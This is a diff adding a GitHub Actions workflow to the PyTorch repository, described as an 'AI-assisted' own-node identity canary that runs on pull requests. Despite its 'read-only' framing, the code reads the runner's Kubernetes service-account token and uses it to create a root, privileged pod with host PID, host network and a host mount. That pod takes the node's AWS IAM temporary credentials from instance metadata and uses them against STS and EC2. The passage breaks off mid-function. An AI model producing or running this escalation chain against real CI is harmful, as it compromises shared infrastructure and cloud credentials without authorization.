@@ -1,0 +1,493 @@
+# Owner(s): ["module: ci"]
+# AI-assisted, temporary read-only own-node diagnostic. Never merge.
+name: CI own-node identity canary
+
+on:
+  pull_request:
+    paths:
+      - .github/workflows/ci-own-node-identity-canary.yml
+
+permissions: {}
+concurrency:
+  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.sha }}-${{ github.event_name == 'workflow_dispatch' }}-${{ github.sha }}
+  cancel-in-progress: true
+
+jobs:
+  probe:
+    if: github.repository == 'pytorch/pytorch'
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - runner: mt-l-x86iavx512-8-64
+            family: mt
+          - runner: lf-l-x86iavx512-8-64
+            family: lf
+    runs-on: ${{ matrix.runner }}
+    timeout-minutes: 8
+    container:
+      image: python:3.12-slim@sha256:5e2bdb1b0d542d5039cffb8181c65930093949194a65c365dfb1b0fe13a4fa5b
+      volumes:
+        - /var/run/secrets/kubernetes.io/serviceaccount:/audit-source:ro
+    steps:
+      - name: Read only the own node identity and delete the temporary Pod
+        env:
+          EXPECTED_RUNNER_NAME: ${{ runner.name }}
+          EXPECTED_FAMILY: ${{ matrix.family }}
+        shell: sh
+        run: |
+          python3 - <<'PY'
+          """Bounded same-node CI canary. All output is booleans; no resource/credential bodies."""
+          import base64
+          import hashlib
+          import http.client
+          import resource
+          import json
+          import os
+          from pathlib import Path
+          import re
+          import socket
+          import ssl
+          import urllib.error
+          import urllib.parse
+          import urllib.request
+          import uuid
+
+          SOURCE = Path("/audit-source")
+          NAMESPACE = "arc-runners"
+          EXPECTED_SUBJECT = "system:serviceaccount:arc-runners:arc-runner"
+          BASE = "https://kubernetes.default.svc"  # @lint-ignore: cluster-local API
+          COLLECTION = "/api/v1/namespaces/arc-runners/pods"
+          SSAR = "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews"
+          POD_IMAGE = "python:3.12-slim@sha256:5e2bdb1b0d542d5039cffb8181c65930093949194a65c365dfb1b0fe13a4fa5b"
+          MAX_JSON = 1024 * 1024
+          MAX_LOG = 8192
+          INNER_TEMPLATE = '"""Own-node metadata and two read-only AWS calls. Never emit response bodies."""\nimport datetime\nimport hashlib\nimport hmac\nimport http.client\nimport json\nimport os\nimport re\nimport resource\nimport ssl\nimport stat\nimport urllib.parse\nimport xml.etree.ElementTree as ET\n\nEXPECTED = __EXPECTED_BINDING__\nNONCE = __NONCE__\nMAX_BODY = 131072\nTUPLES = {\n    "meta-prod-aws-ue1": ("mt", "us-east-1", None),\n    "meta-prod-aws-ue2": ("mt", "us-east-2", None),\n    "meta-prod-aws-uw2": ("mt", "us-west-2", None),\n    "lf-prod-aws-ue1": ("lf", "us-east-1", "391835788720"),\n}\nKEYS = (\n    "same_node", "uid_zero", "host_pid1_uid_zero", "same_host_user_namespace",\n    "systemd_pid1", "host_run_root_owned", "host_run_tmpfs", "systemd_private_socket",\n    "nonce_unit_absent", "systemd_run_available", "systemctl_available",\n    "metadata_reachable", "node_identity_matched", "node_role_matched",\n    "temporary_credentials_present", "sts_authenticated", "own_instance_describe_allowed",\n    "own_instance_describe_denied", "own_instance_identity_matched", "probe_error",\n)\n\n\ndef exact_text(value, pattern):\n    if not isinstance(value, str) or not re.fullmatch(pattern, value):\n        raise ValueError("invalid field")\n    return value\n\n\ndef require(test):\n    if not test:\n        raise ValueError("scope mismatch")\n\n\ndef request(host, method, path, body=None, headers=None, tls=False):\n    # http.client never uses proxies or follows redirects. Ignore CA overrides.\n    require(host == "169.254.169.254" if not tls else host in {\n        f"{service}.{region}.amazonaws.com" for service in ("sts", "ec2")\n        for _, region, _ in TUPLES.values()\n    })\n    if tls:\n        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n        context.load_verify_locations(cafile="/etc/ssl/certs/ca-certificates.crt")\n        conn = http.client.HTTPSConnection(host, timeout=4, context=context)\n    else:\n        conn = http.client.HTTPConnection(host, timeout=3)\n    try:\n        conn.request(method, path, body, headers or {})\n        response = conn.getresponse()\n        raw = response.read(MAX_BODY + 1)\n        require(len(raw) <= MAX_BODY)\n        require(not 300 <= response.status < 400)\n        return response.status, raw\n    finally:\n        conn.close()\n\n\ndef metadata(path, token):\n    require(path in {\n        "/latest/dynamic/instance-identity/document", "/latest/meta-data/instance-id",\n        "/latest/meta-data/placement/region", "/latest/meta-data/iam/info",\n        "/latest/meta-data/iam/security-credentials/",\n    } or path in {"/latest/meta-data/iam/security-credentials/" + c + "-node-role" for c in TUPLES})\n    status, raw = request("169.254.169.254", "GET", path, headers={"X-aws-ec2-metadata-token": token})\n    require(status == 200)\n    return raw.decode("utf-8")\n\n\ndef identity(document, instance_id, region, info, role, expected):\n    require(document.get("instanceId") == instance_id == expected["instance"])\n    require(document.get("region") == region == expected["region"])\n    require(document.get("availabilityZone") == expected["zone"])\n    account = exact_text(document.get("accountId"), r"[0-9]{12}")\n    cluster = role.removesuffix("-node-role")\n    require(role == cluster + "-node-role" and cluster in TUPLES)\n    family, allowed_region, allowed_account = TUPLES[cluster]\n    require(family == expected["family"] and allowed_region == region)\n    require(allowed_account is None or allowed_account == account)\n    require(info.get("Code") == "Success")\n    profile = exact_text(info.get("InstanceProfileArn"), r"arn:aws:iam::[0-9]{12}:instance-profile/[A-Za-z0-9+=,.@_/-]{1,512}")\n    require(profile.split(":")[4] == account)\n    return {"account": account, "region": region, "instance": instance_id, "role": role, "profile": profile}\n\n\ndef credentials(value, now):\n    require(value.get("Code") == "Success")\n    key = exact_text(value.get("AccessKeyId"), r"ASIA[A-Z0-9]{16}")\n    secret = exact_text(value.get("SecretAccessKey"), r"[A-Za-z0-9/+=]{40}")\n    token = exact_text(value.get("Token"), r"[A-Za-z0-9/+=]{16,16384}")\n    expires = exact_text(value.get("Expiration"), r"[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}Z")\n    require(datetime.datetime.strptime(expires, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=datetime.timezone.utc) > now)\n    return key, secret, token\n\n\ndef signing_key(secret, date, region, service):\n    key = ("AWS4" + secret).encode()\n    for value in (date, region, service, "aws4_request"):\n        key = hmac.new(key, value.encode(), hashlib.sha256).digest()\n    return key\n\n\ndef signed_headers(service, region, body, creds, timestamp):\n    host = f"{service}.{region}.amazonaws.com"\n    date = timestamp[:8]\n    scope = f"{date}/{region}/{service}/aws4_request"\n    values = {"content-type": "application/x-www-form-urlencoded; charset=utf-8", "host": host,\n              "x-amz-date": timestamp, "x-amz-security-token": creds[2]}\n    canonical_headers = "".join(f"{key}:{value}\\n" for key, value in sorted(values.items()))\n    names = ";".join(sorted(values))\n    canonical = "\\n".join(("POST", "/", "", canonical_headers, names, hashlib.sha256(body).hexdigest()))\n    to_sign = "\\n".join(("AWS4-HMAC-SHA256", timestamp, scope, hashlib.sha256(canonical.encode()).hexdigest()))\n    signature = hmac.new(signing_key(creds[1], date, region, service), to_sign.encode(), hashlib.sha256).hexdigest()\n    values["Authorization"] = f"AWS4-HMAC-SHA256 Credential={creds[0]}/{scope}, SignedHeaders={names}, Signature={signature}"\n    return values\n\n\ndef aws(service, bound, creds):\n    require(service in ("sts", "ec2"))\n    require(bound["region"] in {item[1] for item in TUPLES.values()})\n    params = {"Action": "GetCallerIdentity", "Version": "2011-06-15"} if service == "sts" else {\n        "Action": "DescribeInstances", "Version": "2016-11-15", "InstanceId.1": exact_text(bound["instance"], r"i-[0-9a-f]{17}")}\n    body = urllib.parse.urlencode(params).encode()\n    stamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%dT%H%M%SZ")\n    return request(f"{service}.{bound[\'region\']}.amazonaws.com", "POST", "/", body,\n                   signed_headers(service, bound["region"], body, creds, stamp), tls=True)\n\n\ndef xml(raw):\n    require(len(raw) <= MAX_BODY and b"<!DOCTYPE" not in raw.upper() and b"<!ENTITY" not in raw.upper())\n    return ET.fromstring(raw)\n\n\ndef one_text(root, path):\n    matches = root.findall(path)\n    require(len(matches) == 1 and isinstance(matches[0].text, str))\n    return matches[0].text\n\n\ndef verify_sts(raw, bound):\n    root = xml(raw)\n    ns = "{https://sts.amazonaws.com/doc/2011-06-15/}"\n    require(root.tag == ns + "GetCallerIdentityResponse")\n    results = root.findall(ns + "GetCallerIdentityResult")\n    require(len(results) == 1)\n    result = results[0]\n    require(one_text(result, ns + "Account") == bound["account"])\n    require(one_text(result, ns + "Arn") == f"arn:aws:sts::{bound[\'account\']}:assumed-role/{bound[\'role\']}/{bound[\'instance\']}")\n\n\ndef verify_ec2(raw, bound):\n    root = xml(raw)\n    ns = "{http://ec2.amazonaws.com/doc/2016-11-15/}"\n    require(root.tag == ns + "DescribeInstancesResponse" and root.find(ns + "nextToken") is None)\n    reservations = root.findall(ns + "reservationSet/" + ns + "item")\n    require(len(reservations) == 1)\n    instances = reservations[0].findall(ns + "instancesSet/" + ns + "item")\n    require(len(instances) == 1)\n    require(one_text(instances[0], ns + "instanceId") == bound["instance"])\n    require(one_text(instances[0], ns + "iamInstanceProfile/" + ns + "arn") == bound["profile"])\n\n\ndef cloud(result, expected):\n    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n    status, raw = request("169.254.169.254", "PUT", "/latest/api/token", headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"})\n    require(status == 200)\n    token = exact_text(raw.decode("ascii"), r"[A-Za-z0-9+/=_-]{1,4096}")\n    result["metadata_reachable"] = True\n    document = json.loads(metadata("/latest/dynamic/instance-identity/document", token))\n    instance_id = metadata("/latest/meta-data/instance-id", token)\n    region = metadata("/latest/meta-data/placement/region", token)\n    # Match the Kubernetes Node before discovering or retrieving credentials.\n    require(document.get("instanceId") == instance_id == expected["instance"])\n    require(document.get("region") == region == expected["region"])\n    require(document.get("availabilityZone") == expected["zone"])\n    result["node_identity_matched"] = True\n    info = json.loads(metadata("/latest/meta-data/iam/info", token))\n    role = exact_text(metadata("/latest/meta-data/iam/security-credentials/", token), r"[a-z0-9-]{1,128}")\n    bound = identity(document, instance_id, region, info, role, expected)\n    result["node_role_matched"] = True\n    creds = credentials(json.loads(metadata("/latest/meta-data/iam/security-credentials/" + role, token)), datetime.datetime.now(datetime.timezone.utc))\n    result["temporary_credentials_present"] = True\n    status, raw = aws("sts", bound, creds)\n    require(status == 200)\n    verify_sts(raw, bound)\n    result["sts_authenticated"] = True\n    status, raw = aws("ec2", bound, creds)\n    if status == 403:\n        result["own_instance_describe_denied"] = True\n        return\n    require(status == 200)\n    result["own_instance_describe_allowed"] = True\n    verify_ec2(raw, bound)\n    result["own_instance_identity_matched"] = True\n\n\ndef lifecycle(result):\n    result["systemd_pid1"] = open("/proc/1/comm").read(32).strip() == "systemd"\n    st = os.stat("/audit-host-run", follow_symlinks=False)\n    result["host_run_root_owned"] = stat.S_ISDIR(st.st_mode) and st.st_uid == 0\n    # Examine only the exact mounted /run record, not host mount contents.\n    with open("/proc/self/mountinfo") as stream:\n        records = [line.split() for line in stream if " /audit-host-run " in line]\n    result["host_run_tmpfs"] = len(records) == 1 and records[0][records[0].index("-") + 1] == "tmpfs"\n    try:\n        result["systemd_private_socket"] = stat.S_ISSOCK(os.stat("/audit-host-run/systemd/private").st_mode)\n    except FileNotFoundError:\n        pass\n    result["nonce_unit_absent"] = not os.path.lexists("/audit-host-run/systemd/transient/ci-audit-" + NONCE + ".service")\n    for binary in ("systemd-run", "systemctl"):\n        result[binary.replace("-", "_") + "_available"] = os.access("/proc/1/root/usr/bin/" + binary, os.X_OK)\n\n\ndef main():\n    result = dict.fromkeys(KEYS, False)\n    try:\n        result["same_node"] = os.environ.get("ACTUAL_NODE") == EXPECTED["node"]\n        result["uid_zero"] = os.getuid() == 0\n        require(result["same_node"] and result["uid_zero"])\n        result["host_pid1_uid_zero"] = os.stat("/proc/1").st_uid == 0\n        parent, current = os.stat("/proc/1/ns/user"), os.stat("/proc/self/ns/user")\n        result["same_host_user_namespace"] = (parent.st_dev, parent.st_ino) == (current.st_dev, current.st_ino)\n        require(result["host_pid1_uid_zero"] and result["same_host_user_namespace"])\n        lifecycle(result)\n        cloud(result, EXPECTED)\n    except Exception:\n        result["probe_error"] = True\n    return result\n\n\nif __name__ == "__main__":\n    print(json.dumps(main(), sort_keys=True))\n    # Kubelet transfers the fixed result into exact-UID terminal Pod status.\n    raise SystemExit(1)\n'  # @lint-ignore: fixed service protocol namespaces
+          INNER_KEYS = frozenset(('same_node', 'uid_zero', 'host_pid1_uid_zero', 'same_host_user_namespace', 'systemd_pid1', 'host_run_root_owned', 'host_run_tmpfs', 'systemd_private_socket', 'nonce_unit_absent', 'systemd_run_available', 'systemctl_available', 'metadata_reachable', 'node_identity_matched', 'node_role_matched', 'temporary_credentials_present', 'sts_authenticated', 'own_instance_describe_allowed', 'own_instance_describe_denied', 'own_instance_identity_matched', 'probe_error'))
+
+
+          class NoRedirect(urllib.request.HTTPRedirectHandler):
+              def redirect_request(self, req, fp, code, msg, headers, newurl):
+                  return None
+
+
+          def dns_name(value, maximum=253):
+              return isinstance(value, str) and 0 < len(value) <= maximum and all(
+                  re.fullmatch(r"[a-z0-9](?:[-a-z0-9]{0,61}[a-z0-9])?", part)
+                  for part in value.split(".")
+              )
+
+
+          def uid(value):
+              try:
+                  return isinstance(value, str) and str(uuid.UUID(value)) == value
+              except ValueError:
+                  return False
+
+
+          def child_nonce(runner_name, run_id, run_attempt):
+              if not dns_name(runner_name) or not re.fullmatch(r"[0-9]+", run_id) or not re.fullmatch(r"[0-9]+", run_attempt):
+                  raise ValueError("invalid workflow identity")
+              identity = json.dumps([runner_name, run_id, run_attempt], separators=(",", ":")).encode()
+              return hashlib.sha256(identity).hexdigest()[:32]
+
+
+          def own_pod_name(runner_name, hostname):
+              if not dns_name(runner_name) or not dns_name(hostname, 63):
+                  raise ValueError("invalid Pod identity")
+              if hostname != runner_name[:54] + "-workflow":
+                  raise ValueError("hostname does not match registered runner")
+              return hostname
+
+
+          def validate_own_pod(pod, runner_name, hostname):
+              meta, spec, status = pod.get("metadata", {}), pod.get("spec", {}), pod.get("status", {})
+              if not (
+                  pod.get("kind") == "Pod" and meta.get("name") == hostname
+                  and meta.get("namespace") == NAMESPACE and uid(meta.get("uid"))
+                  and meta.get("labels", {}).get("runner-pod") == runner_name
+                  and not meta.get("deletionTimestamp") and status.get("phase") == "Running"
+                  and spec.get("serviceAccountName") == "arc-workflow"
+                  and spec.get("automountServiceAccountToken") is False
+                  and dns_name(spec.get("nodeName"))
+              ):
+                  raise ValueError("own workflow Pod verification failed")
+              tolerations = spec.get("tolerations", [])
+              if not isinstance(tolerations, list) or len(tolerations) > 32 or any(not isinstance(t, dict) for t in tolerations):
+                  raise ValueError("invalid own tolerations")
+              # nodeName bypasses scheduling, not NoExecute eviction. Copy only the
+              # existing workflow Pod's relevant tolerations; never broaden them.
+              tolerations = [t for t in tolerations if t.get("effect", "") in ("", "NoExecute")]
+              return {"name": hostname, "uid": meta["uid"], "node": spec["nodeName"], "tolerations": tolerations}
+
+
+          def validate_node(obj, own, family):
+              meta, spec = obj.get("metadata", {}), obj.get("spec", {})
+              labels = meta.get("labels", {})
+              provider = spec.get("providerID", "")
+              match = re.fullmatch(r"aws:///((us-(?:east|west)-[12])[a-z])/(i-[0-9a-f]{17})", provider)
+              if not (obj.get("kind") == "Node" and meta.get("name") == own["node"] and uid(meta.get("uid"))
+                      and not meta.get("deletionTimestamp") and match and family in ("mt", "lf")
+                      and labels.get("topology.kubernetes.io/zone") == match[1]
+                      and labels.get("topology.kubernetes.io/region") == match[2]):
+                  raise ValueError("own Node verification failed")
+              return {"node": own["node"], "node_uid": meta["uid"], "provider": provider,
+                      "zone": match[1], "region": match[2], "instance": match[3], "family": family}
+
+
+          def revalidate_binding(again, own, fresh_node, binding):
+              if any(again[k] != own[k] for k in ("name", "uid", "node")) or fresh_node != binding:
+                  raise ValueError("own binding changed")
+
+
+          def inner_script(binding, nonce):
+              if not re.fullmatch(r"[0-9a-f]{32}", nonce):
+                  raise ValueError("invalid probe constants")
+              return INNER_TEMPLATE.replace("__EXPECTED_BINDING__", repr(binding)).replace("__NONCE__", repr(nonce))
+
+
+          def proposed_pod(own, name, nonce):
+              if name != "ci-own-node-" + nonce or not dns_name(name, 63) or not uid(own["uid"]):
+                  raise ValueError("invalid canary identity")
+              return {
+                  "apiVersion": "v1", "kind": "Pod",
+                  "metadata": {
+                      "name": name, "namespace": NAMESPACE,
+                      "labels": {"ci-security-canary": nonce},
+                      "ownerReferences": [{"apiVersion": "v1", "kind": "Pod", "name": own["name"], "uid": own["uid"], "controller": False, "blockOwnerDeletion": False}],
+                  },
+                  "spec": {
+                      "nodeName": own["node"], "tolerations": own["tolerations"], "serviceAccountName": "arc-workflow",
+                      "automountServiceAccountToken": False, "enableServiceLinks": False,
+                      "hostPID": True, "hostUsers": True, "hostNetwork": True, "hostIPC": False,
+                      "restartPolicy": "Never", "activeDeadlineSeconds": 60, "terminationGracePeriodSeconds": 0,
+                      "containers": [{
+                          "name": "probe", "image": POD_IMAGE, "imagePullPolicy": "IfNotPresent",
+                          "terminationMessagePolicy": "FallbackToLogsOnError",
+                          "command": ["python3", "-c", inner_script(own["binding"], nonce)],
+                          "env": [{"name": "ACTUAL_NODE", "valueFrom": {"fieldRef": {"apiVersion": "v1", "fieldPath": "spec.nodeName"}}}, {"name": "PYTHONDONTWRITEBYTECODE", "value": "1"}],
+                          "securityContext": {"privileged": True, "readOnlyRootFilesystem": True, "runAsUser": 0, "runAsGroup": 0},
+                          "resources": {"requests": {"cpu": "10m", "memory": "32Mi"}, "limits": {"cpu": "100m", "memory": "64Mi"}},
+                          "volumeMounts": [{"name": "host-run", "mountPath": "/audit-host-run", "readOnly": True}],
+                      }],
+                      "volumes": [{"name": "host-run", "hostPath": {"path": "/run", "type": "Directory"}}],
+                  },
+              }
+
+
+          def ownership_matches(pod, expected):
+              meta, want = pod.get("metadata", {}), expected["metadata"]
+              return (
+                  meta.get("name") == want["name"] and meta.get("namespace") == NAMESPACE
+                  and meta.get("labels", {}).get("ci-security-canary") == want["labels"]["ci-security-canary"]
+                  and meta.get("ownerReferences") == want["ownerReferences"]
+                  and uid(meta.get("uid"))
+              )
+
+
+          def admitted_spec_preserved(pod, expected):
+              meta, spec, wanted = pod.get("metadata", {}), pod.get("spec", {}), expected["spec"]
+              if meta.get("finalizers"):
+                  return False
+              if not (pod.get("kind") == "Pod" and meta.get("name") == expected["metadata"]["name"] and meta.get("namespace") == NAMESPACE
+                      and meta.get("labels", {}).get("ci-security-canary") == expected["metadata"]["labels"]["ci-security-canary"]
+                      and meta.get("ownerReferences") == expected["metadata"]["ownerReferences"]):
+                  return False
+              if any(spec.get(k) != wanted[k] for k in ("nodeName", "serviceAccountName", "automountServiceAccountToken", "enableServiceLinks", "hostPID", "hostUsers", "restartPolicy", "activeDeadlineSeconds", "terminationGracePeriodSeconds")):
+                  return False
+              if spec.get("tolerations", []) != wanted["tolerations"]:
+                  return False
+              if spec.get("hostNetwork") is not True or spec.get("hostIPC", False) or spec.get("initContainers") or spec.get("ephemeralContainers"):
+                  return False
+              if spec.get("securityContext") or spec.get("shareProcessNamespace", False):
+                  return False
+              if spec.get("volumes") != wanted["volumes"] or len(spec.get("containers", [])) != 1:
+                  return False
+              got, want = spec["containers"][0], wanted["containers"][0]
+              if set(got) - set(want) - {"terminationMessagePath", "stdin", "stdinOnce", "tty"}:
+                  return False
+              if got.get("terminationMessagePath", "/dev/termination-log") != "/dev/termination-log" or any(got.get(k, False) for k in ("stdin", "stdinOnce", "tty")):
+                  return False
+              if any(got.get(k) != want[k] for k in ("name", "image", "imagePullPolicy", "terminationMessagePolicy", "command", "env", "securityContext", "resources")) or got.get("args"):
+                  return False
+              mounts = got.get("volumeMounts", [])
+              return mounts == want["volumeMounts"]
+
+
+          class Client:
+              def __init__(self, token, opener, own_name, child_name):
+                  self.token, self.opener = token, opener
+                  self.own_path, self.child_path = COLLECTION + "/" + own_name, COLLECTION + "/" + child_name
+                  self.child_name = child_name
+                  self.node_path = None
+                  self.approved_payload = None
+                  self.cleanup_preflight_allowed = False
+                  self.create_attempted = False
+                  self.created_uid = None
+                  self.unknown_create_absent = False
+                  self.delete_uid = None
+
+              def cleanup_review(self, verb):
+                  if verb not in ("get", "delete", "watch"):
+                      raise ValueError("invalid cleanup verb")
+                  return {"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectAccessReview", "spec": {"resourceAttributes": {"group": "", "resource": "pods", "namespace": NAMESPACE, "name": self.child_name, "verb": verb}}}
+
+              def preflight_cleanup(self):
+                  self.cleanup_preflight_allowed = False
+                  for verb in ("get", "delete", "watch"):
+                      review = self.cleanup_review(verb)
+                      status, response = self.json("POST", SSAR, json.dumps(review).encode())
+                      decision = response.get("status", {})
+                      attributes = response.get("spec", {}).get("resourceAttributes", {})
+                      expected = review["spec"]["resourceAttributes"]
+                      # API JSON omits the empty core group on serialization.
+                      scope_preserved = set(response.get("spec", {})) == {"resourceAttributes"} and attributes.get("group", "") == "" and {k: v for k, v in attributes.items() if k != "group"} == {k: v for k, v in expected.items() if k != "group"}
+                      if (status != 201 or response.get("kind") != "SelfSubjectAccessReview" or not scope_preserved
+                              or decision.get("allowed") is not True or decision.get("denied", False) or decision.get("evaluationError")):
+                          return False
+                  self.cleanup_preflight_allowed = True
+                  return True
+
+              def remember_created(self, status, obj):
+                  meta = obj.get("metadata", {})
+                  if not (self.create_attempted and status == 201 and obj.get("kind") == "Pod"
+                          and meta.get("name") == self.child_name and meta.get("namespace") == NAMESPACE and uid(meta.get("uid"))):
+                      return False
+                  self.created_uid = meta["uid"]
+                  return True
+
+              def authorize(self, method, path, payload):
+                  parsed = urllib.parse.urlsplit(path)
+                  query = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+                  if parsed.scheme or parsed.netloc or parsed.fragment:
+                      raise ValueError("nonlocal API path")
+                  if method == "POST" and parsed.path == SSAR and not query:
+                      if json.loads(payload) in [self.cleanup_review(verb) for verb in ("get", "delete", "watch")]:
+                          return
+                  if method == "POST" and parsed.path == COLLECTION:
+                      if query == [("dryRun", "All")]:
+                          return
+                      if not query and self.cleanup_preflight_allowed and payload == self.approved_payload and payload is not None and not self.create_attempted:
+                          self.create_attempted = True
+                          return
+                  if method == "GET" and not query and parsed.path in (self.own_path, self.child_path, self.node_path):
+                      return
+                  if method == "GET" and parsed.path == COLLECTION and len(query) == 4:
+                      params = dict(query)
+                      if (len(params) == 4 and params.get("watch") == "true" and params.get("fieldSelector") == "metadata.name=" + self.child_name
+                              and re.fullmatch(r"[0-9]+", params.get("resourceVersion", ""))
+                              and re.fullmatch(r"[0-9]+", params.get("timeoutSeconds", "")) and 1 <= int(params["timeoutSeconds"]) <= 90):
+                          return
+                  if method == "DELETE" and not query and parsed.path == self.child_path and uid(self.created_uid) and self.delete_uid == self.created_uid:
+                      expected = {"apiVersion": "v1", "kind": "DeleteOptions", "gracePeriodSeconds": 0, "preconditions": {"uid": self.delete_uid}}
+                      if json.loads(payload) == expected:
+                          return
+                  raise ValueError("out-of-scope API operation")
+
+              def open(self, method, path, payload=None, timeout=10, partial=False):
+                  self.authorize(method, path, payload)
+                  headers = {"Authorization": "Bearer " + self.token, "Content-Type": "application/json"}
+                  if partial:
+                      headers["Accept"] = "application/json;as=PartialObjectMetadata;g=meta.k8s.io;v=v1"
+                  return self.opener.open(urllib.request.Request(BASE + path, data=payload, method=method, headers=headers), timeout=timeout)
+
+              def json(self, method, path, payload=None, partial=False):
+                  with self.open(method, path, payload, partial=partial) as response:
+                      raw = response.read(MAX_JSON + 1)
+                      if len(raw) > MAX_JSON:
+                          raise ValueError("oversized API response")
+                      return response.status, json.loads(raw)
+
+              def get_child(self, partial=False):
+                  try:
+                      return self.json("GET", self.child_path, partial=partial)[1]
+                  except urllib.error.HTTPError as error:
+                      if error.code == 404:
+                          return None
+                      raise
+
+              def watch(self, child_uid, resource_version, deleted=False, timeout=90):
+                  if not uid(child_uid) or not re.fullmatch(r"[0-9]+", resource_version):
+                      raise ValueError("invalid watch identity")
+                  query = urllib.parse.urlencode({"watch": "true", "fieldSelector": "metadata.name=" + self.child_name, "resourceVersion": resource_version, "timeoutSeconds": str(timeout)})
+                  with self.open("GET", COLLECTION + "?" + query, timeout=timeout + 5) as response:
+                      while True:
+                          line = response.readline(MAX_JSON + 1)
+                          if not line:
+                              return False
+                          if len(line) > MAX_JSON:
+                              raise ValueError("oversized watch event")
+                          event = json.loads(line)
+                          obj = event.get("object", {})
+                          meta = obj.get("metadata", {})
+                          if meta.get("name") != self.child_name or meta.get("namespace") != NAMESPACE or meta.get("uid") != child_uid:
+                              continue
+                          if deleted and event.get("type") == "DELETED":
+                              return True
+                          if not deleted and obj.get("status", {}).get("phase") in ("Succeeded", "Failed"):
+                              return True
+
+              def wait_terminal(self, child_uid):
+                  obj = self.get_child()
+                  if obj is None or obj.get("metadata", {}).get("uid") != child_uid:
+                      return False
+                  if obj.get("status", {}).get("phase") in ("Succeeded", "Failed"):
+                      return True
+                  return self.watch(child_uid, obj["metadata"]["resourceVersion"])
+
+              def cleanup(self, expected):
+                  obj = self.get_child(partial=True)
+                  if self.created_uid is None:
+                      # A lost POST response is unresolved even if this GET is 404:
+                      # the original request may still complete. Mutable metadata
+                      # cannot authenticate a replacement Pod's creation request.
+                      self.unknown_create_absent = obj is None
+                      return False
+                  if obj is None:
+                      return True
+                  meta = obj.get("metadata", {})
+                  if not (obj.get("kind") == "PartialObjectMetadata" and meta.get("name") == self.child_name
+                          and meta.get("namespace") == NAMESPACE and uid(meta.get("uid"))):
+                      return False
+                  if meta["uid"] != self.created_uid:
+                      return False
+                  self.delete_uid = self.created_uid
+                  resource_version = obj["metadata"]["resourceVersion"]
+                  payload = json.dumps({"apiVersion": "v1", "kind": "DeleteOptions", "gracePeriodSeconds": 0, "preconditions": {"uid": self.delete_uid}}).encode()
+                  try:
+                      self.json("DELETE", self.child_path, payload)
+                  except urllib.error.HTTPError as error:
+                      if error.code == 404:
+                          return True
+                      raise
+                  current = self.get_child(partial=True)
+                  if current is None:
+                      return True
+                  if current.get("metadata", {}).get("uid") != self.delete_uid:
+                      return False
+                  return self.watch(self.delete_uid, current.get("metadata", {}).get("resourceVersion", resource_version), deleted=True, timeout=60)
+
+
+          def workflow_metadata_control():
+              resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
+              conn = http.client.HTTPConnection("169.254.169.254", timeout=2)
+              try:
+                  conn.request("PUT", "/latest/api/token", headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"})
+                  response = conn.getresponse()
+                  body = response.read(4097)
+                  return response.status == 200 and 0 < len(body) <= 4096
+              except Exception:
+                  return False
+              finally:
+                  conn.close()
+
+
+          def main():
+              result = {key: False for key in (
+                  "native_job_token_absent", "workflow_metadata_reachable", "copied_identity_matches_runner", "own_pod_verified", "own_node_verified", "own_binding_revalidated",
+                  "exact_spec_dry_run_allowed", "cleanup_preflight_allowed", "pod_create_attempted", "created_uid_recorded", "owned_pod_created", "actual_spec_preserved",
+                  "pod_reached_terminal", "cleanup_confirmed", "cleanup_failed", "unresolved_create_outcome", "unknown_create_name_absent", "probe_error", "proof_accepted",
+              )}
+              result.update({"host_" + key: False for key in INNER_KEYS})
+              client = expected = None
+              conflict = False
+              try:
+                  result["workflow_metadata_reachable"] = workflow_metadata_control()
+                  result["native_job_token_absent"] = not Path("/var/run/secrets/kubernetes.io/serviceaccount/token").exists()
+                  token_bytes = (SOURCE / "token").read_bytes().strip()
+                  if not 0 < len(token_bytes) <= 16384 or (SOURCE / "namespace").read_text().strip() != NAMESPACE:
+                      return result
+                  token = token_bytes.decode("ascii")
+                  payload = token.split(".")[1]
+                  claims = json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))
+                  result["copied_identity_matches_runner"] = claims.get("sub") == EXPECTED_SUBJECT
+                  if not result["copied_identity_matches_runner"]:
+                      return result
+                  runner_name = os.environ.get("EXPECTED_RUNNER_NAME", "")
+                  name = own_pod_name(runner_name, socket.gethostname())
+                  nonce = child_nonce(runner_name, os.environ.get("GITHUB_RUN_ID", ""), os.environ.get("GITHUB_RUN_ATTEMPT", ""))
+                  child_name = "ci-own-node-" + nonce
+                  context = ssl.create_default_context(cafile=str(SOURCE / "ca.crt"))
+                  opener = urllib.request.build_opener(urllib.request.ProxyHandler({}), urllib.request.HTTPSHandler(context=context), NoRedirect())
+                  client = Client(token, opener, name, child_name)
+                  own = validate_own_pod(client.json("GET", client.own_path)[1], runner_name, name)
+                  result["own_pod_verified"] = True
+                  family = os.environ.get("EXPECTED_FAMILY", "")
+                  if family not in ("mt", "lf"):
+                      raise ValueError("invalid runner family")
+                  client.node_path = "/api/v1/nodes/" + own["node"]
+                  binding = validate_node(client.json("GET", client.node_path)[1], own, family)
+                  own["binding"] = binding
+                  result["own_node_verified"] = True
+                  expected = proposed_pod(own, child_name, nonce)
+                  encoded = json.dumps(expected, sort_keys=True, separators=(",", ":")).encode()
+                  status, dry = client.json("POST", COLLECTION + "?dryRun=All", encoded)
+                  result["exact_spec_dry_run_allowed"] = status == 201 and admitted_spec_preserved(dry, expected)
+                  if not result["exact_spec_dry_run_allowed"]:
+                      return result
+                  result["cleanup_preflight_allowed"] = client.preflight_cleanup()
+                  if not result["cleanup_preflight_allowed"]:
+                      return result
+                  client.approved_payload = encoded
+                  try:
+                      status, created = client.json("POST", COLLECTION, encoded)
+                  except urllib.error.HTTPError as error:
+                      conflict = error.code == 409
+                      raise
+                  # The exact server-returned identity is authoritative for cleanup even
+                  # if admission changed labels, ownerReferences, or the requested spec.
+                  result["created_uid_recorded"] = client.remember_created(status, created)
+                  if not result["created_uid_recorded"] or not ownership_matches(created, expected):
